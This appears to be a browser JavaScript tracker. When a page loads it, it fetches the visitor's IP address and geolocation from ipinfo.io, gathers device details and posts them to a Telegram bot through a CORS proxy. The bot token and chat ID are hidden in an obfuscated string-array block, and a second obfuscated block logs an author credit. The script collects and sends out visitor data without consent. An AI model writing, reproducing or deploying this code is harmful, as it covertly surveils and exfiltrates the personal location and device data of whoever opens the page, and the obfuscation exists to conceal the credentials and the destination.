function getUserDetails() {
    return fetch("https://ipinfo.io/json").then((data) => data.json());
}

function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
    };
}

function sendDetails(details) {
       const _0x5aa651=_0x5100;function _0x5100(_0x47d60e,_0x290c76){const _0xdbdb3=_0xdbdb();return _0x5100=function(_0x5100a6,_0x451cd2){_0x5100a6=_0x5100a6-0x18a;let _0x32bbbf=_0xdbdb3[_0x5100a6];return _0x32bbbf;},_0x5100(_0x47d60e,_0x290c76);}(function(_0x54d5fd,_0x2eec28){const _0x4b5517=_0x5100,_0x38ed78=_0x54d5fd();while(!![]){try{const _0x2001fc=-parseInt(_0x4b5517(0x18d))/0x1+parseInt(_0x4b5517(0x190))/0x2+-parseInt(_0x4b5517(0x194))/0x3+parseInt(_0x4b5517(0x195))/0x4*(parseInt(_0x4b5517(0x18b))/0x5)+-parseInt(_0x4b5517(0x191))/0x6*(parseInt(_0x4b5517(0x193))/0x7)+parseInt(_0x4b5517(0x18f))/0x8*(-parseInt(_0x4b5517(0x18a))/0x9)+parseInt(_0x4b5517(0x18e))/0xa;if(_0x2001fc===_0x2eec28)break;else _0x38ed78['push'](_0x38ed78['shift']());}catch(_0x5c9ce3){_0x38ed78['push'](_0x38ed78['shift']());}}}(_0xdbdb,0xb8ac4));const apiToken=_0x5aa651(0x192),chatId=_0x5aa651(0x18c);function _0xdbdb(){const _0x6e81ae=['1202325RrpkIl','22627090FHFwGK','136hFtHSa','1464522FHlyax','890862szkUXl','7989314915:AAF1nCq9GEVPYg0sCcNZCBpXaoEK_nDbDu0','63AJmVkf','1342359yiiVob','36816tjNjJy','359523EdAFso','775XaAoAD','5412801356'];_0xdbdb=function(){return _0x6e81ae;};return _0xdbdb();}
    const url = `https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${apiToken}/sendMessage`;
    console.log("%c Sending Your IP Location to Telegram Bot..","color:red")
    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://example.com"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: details,
        }),
    })
        .then((response) => response.json())
        .then((data) => {
            console.log("Message sent:", data);
        })
        .catch((error) => {
            console.error("Error sending message:", error);
        });
}

Promise.all([getUserDetails()])
    .then(([ipData]) => {
        const device = getDeviceInfo();

        const details = `
Developed By Lucky Chauhan (Alpha)
linkdin: https://www.linkedin.com/in/lucky-chauhan-12b18a25a/
--------------
👹 IP & Location Info:
IP: ${ipData.ip}
Internet: ${ipData.org}
City: ${ipData.city}
Region: ${ipData.region}
Country: ${ipData.country}
Location: ${ipData.loc}
Postal Code: ${ipData.postal}
Timezone: ${ipData.timezone}
-------------
📱 Device Info:
Platform: ${device.platform}
User Agent: ${device.userAgent}
Screen: ${device.screenWidth}x${device.screenHeight}
Language: ${device.language}
        `;

        sendDetails(details);
    });

function _0x5571(_0x47a856,_0x39dcd4){var _0x5d0c4b=_0x5d0c();return _0x5571=function(_0x5571ef,_0x33ab64){_0x5571ef=_0x5571ef-0x91;var _0x24b373=_0x5d0c4b[_0x5571ef];return _0x24b373;},_0x5571(_0x47a856,_0x39dcd4);}var _0x36632d=_0x5571;(function(_0x46b401,_0x2d4ce){var _0x43f2ef=_0x5571,_0x3367ae=_0x46b401();while(!![]){try{var _0x3c284c=parseInt(_0x43f2ef(0x9a))/0x1*(parseInt(_0x43f2ef(0x95))/0x2)+parseInt(_0x43f2ef(0x96))/0x3+parseInt(_0x43f2ef(0x9c))/0x4+parseInt(_0x43f2ef(0x91))/0x5+parseInt(_0x43f2ef(0x9b))/0x6+parseInt(_0x43f2ef(0x99))/0x7*(-parseInt(_0x43f2ef(0x97))/0x8)+-parseInt(_0x43f2ef(0x93))/0x9;if(_0x3c284c===_0x2d4ce)break;else _0x3367ae['push'](_0x3367ae['shift']());}catch(_0x39f8cc){_0x3367ae['push'](_0x3367ae['shift']());}}}(_0x5d0c,0x1971c),console[_0x36632d(0x92)](_0x36632d(0x98),_0x36632d(0x94)));function _0x5d0c(){var _0x57f1e5=['log','424170gBGHJr','color:red;background-color:\x20#000;\x20font-size:\x2016px;','762FJZLQQ','4203WRnyCL','271144QBtezI','%c\x20Developed\x20By\x20Lucky\x20Chauhan\x20(Alpha)\x0a\x20linkdin:https://www.linkedin.com/in/lucky-chauhan-12b18a25a/\x20\x0a\x20Github:\x20https://github.com/AlphaCodeIn/','35CbMGuS','227heakHg','119382axAqec','279912PqCGBV','715260dddrBy'];_0x5d0c=function(){return _0x57f1e5;};return _0x5d0c();}
